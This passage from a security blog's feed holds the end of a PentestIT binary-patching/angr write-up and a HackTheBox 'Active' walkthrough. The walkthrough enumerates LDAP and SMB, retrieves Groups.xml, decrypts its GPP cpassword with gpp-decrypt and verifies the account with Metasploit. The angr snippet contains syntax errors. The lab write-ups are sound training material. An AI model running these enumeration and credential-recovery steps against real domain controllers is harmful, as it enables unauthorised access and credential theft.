__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Binary Ninja can be used to disassemble the binary and understand it better. Looking at the disassembled binary in graph view, it is expecting user input as a value password and is executing a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;check_pw&lt;/code&gt; and depending on the output and if the user value and password matches, they are sent to the correct branch.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse1.png&quot; alt=&quot;alt text&quot; title=&quot;reverse1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;check_pw&lt;/code&gt; function, the comparison of the user value and password value can be seen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse2.png&quot; alt=&quot;alt text&quot; title=&quot;reverse2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;JE&lt;/code&gt; (Jump Equal) function can be modified to &lt;code class=&quot;highlighter-rouge&quot;&gt;JNE&lt;/code&gt; (Jump not Equal) to match the condition to be true even if a wrong password is provided.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse3.png&quot; alt=&quot;alt text&quot; title=&quot;reverse3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running the binary again, the access is granted however a token is not provided.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse4.png&quot; alt=&quot;alt text&quot; title=&quot;reverse4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since the condition of this executable is based on a simple compare function, symbolic execution could be used to grant access to this binary. Symbolic execution (also symbolic evaluation) is a means of analyzing a program to determine what inputs cause each part of a program to execute. &lt;a href=&quot;https://github.com/angr/angr&quot;&gt;angr&lt;/a&gt; can be used to solve this. angr is a binary analysis platform written by the Computer Security Lab at UC Santa Barbara, SEFCOM at Arizona State University, and their associated CTF team, Shellphish for CTFs.&lt;/p&gt;

&lt;p&gt;Looking at angr documentation &lt;a href=&quot;https://docs.angr.io/core-concepts/pathgroups&quot;&gt;https://docs.angr.io/core-concepts/pathgroups&lt;/a&gt;, the following code can be used on the executable.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import angr

project = angr.Project(&quot;./bin&quot;)
simgr = project.factory.simgr()
simgr.explore(find=lamda s: b&quot;ACCESS GRANTED!&quot; in s.posix.dumps(1)
s = simgr.found[0]
print(s.posix.dumps(0))
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;By running the Simulation manager, the “ACCESS GRANTED” state can be achieved and the reverse token can be obtained.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse5.png&quot; alt=&quot;alt text&quot; title=&quot;reverse5&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 21 Jan 2019 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</guid>
        
        <category>pentestit</category>
        
        
        <category>netsec</category>
        
      </item>
    
      <item>
        <title>HackTheBox : Active Walkthrough</title>
        <description>&lt;p&gt;This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement &lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; can also be used to scan the entire port range upto 65536&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -sV 10.10.10.100 -n -sC -Pn -vvv
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-21 16:23 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.29s elapsed
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.055s latency).
Scanned at 2019-06-21 16:23:12 EDT for 215s
Not shown: 983 closed ports
Reason: 983 resets
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2019-06-21 20:17:10Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (c)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6m20s, deviation: 0s, median: -6m20s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 8052/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 20043/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-06-21 16:18:12
|_  start_date: 2019-06-21 07:26:26

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.99 seconds
           Raw packets sent: 1344 (59.136KB) | Rcvd: 1001 (40.108KB)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at the provided LDAP information, it can be deduced that DNS name for this machine is active.htb. This can be added to your hosts file. It is also obvious that by the services open such as DNS, LDAP and Kerberos, this is a domain controller&lt;/p&gt;

&lt;h3 id=&quot;ldap-enumeration&quot;&gt;LDAP Enumeration&lt;/h3&gt;

&lt;p&gt;Since LDAP is open, enumeration can be conduced on this service.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -p 389 --script ldap-rootdse active.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-22 16:58 EDT
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.057s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   &amp;lt;ROOT&amp;gt;
|       currentTime: 20190622205142.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=active,DC=htb
|       namingContexts: CN=Configuration,DC=active,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
|       defaultNamingContext: DC=active,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
|       rootDomainNamingContext: DC=active,DC=htb
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 90299
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: DC.active.htb
|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
Service Info: Host: DC; OS: Windows 2008 R2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Root Directory Server Agent Service Entry or RootDSE is usually provided LDAP servers and they must provide information about itself and other information that is specific to each server.&lt;/p&gt;

&lt;p&gt;The ldap-brute script can also be used to conduct brute force attacks on the server using LDAP, however this can be dangeorus and could lock out valid accounts. If Anonymous Bind is enabled , we could conduct ldap search queries to try searching for the base. However, it looks like that is not possible.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# ldapsearch -h 10.10.10.100 -p 389 -x -b &quot;dc=active,dc=htb&quot;
# extended LDIF
#
# LDAPv3
# base &amp;lt;dc=active,dc=htb&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v1db1

# numResponses: 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h3&gt;

&lt;p&gt;Since SMB is open, enum4linux can be used to conduct information on that service.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# enum4linux 10.10.10.100
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun 22 17:23:52 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.100
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.100    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.100    |
 ============================================ 
Looking up status of 10.10.10.100
No reply from 10.10.10.100

 ===================================== 
|    Session Check on 10.10.10.100    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.100 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.100    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.10.100    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.100 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.100    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/ADMIN$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/C$	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/IPC$	Mapping: OK	Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/NETLOGON	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Replication	Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/SYSVOL	Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Users	Mapping: DENIED, Listing: N/A

 ==================================================== 
|    Password Policy Information for 10.10.10.100    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.100 using a NULL share

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

[+] Trying protocol 139/SMB...

	[!] Protocol failed: ('Cannot request session', 240, 130)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ============================== 
|    Groups on 10.10.10.100    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
[E] Can't get local groups: NT_STATUS_ACCESS_DENIED

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.10.100    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Jun 22 17:24:30 2019
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at enum4linux output, the Replication share (//10.10.10.100/Replication) seems to be accessible. SMBClient (&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L 10.10.10.100&lt;/code&gt;) can also be used to confirm this.&lt;/p&gt;

&lt;p&gt;By enumerating this share using smbmap, the following can be seen:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -R Replication -H 10.10.10.100 
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	Replication                                       	READ ONLY
	.\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	active.htb
	.\\active.htb\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	scripts
	.\\active.htb\DfsrPrivate\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Installing
	.\\active.htb\Policies\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--               23 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--              119 Sat Jul 21 06:38:11 2018	GPE.INI
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Preferences
	-r--r--r--             2788 Sat Jul 21 06:38:11 2018	Registry.pol
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Windows NT
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	SecEdit
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--             1098 Sat Jul 21 06:38:11 2018	GptTmpl.inf
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Groups
	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--              533 Sat Jul 21 06:38:11 2018	Groups.xml
	.\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	-r--r--r--               22 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It seems that that Groups.xml file is accessible. In older versions of Windows servers (pre 2012), Groups.xml can be used by system administrator to create local administators within a domain using a domain controller. This file can be fetched using &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Looking at the obtained Groups.xml file, the important sections in the groups.xml file are the username and cpassword.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;active.htb\SVC_TGS&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2018-07-18 20:46:06&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;active.htb\SVC_TGS&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/User&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;gpp-decrypt can be used to get the plaintext value of the recovered cpassword.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using metasploit’s SMB Login module, these credentials can be used to double check access.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary(scanner/smb/smb_login) &amp;gt; run

[*] 10.10.10.100:445      - 10.10.10.100:445 - Starting SMB login bruteforce
[+] 10.10.10.100:445      - 10.10.10.100:445 - Success: 'active.htb\SVC_TGS:GPPstillStandingStrong2k18'
[!] 10.10.10.100:445      - No active DB -- Credential data will not be saved!
[*] 10.10.10.100:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) &amp;gt;
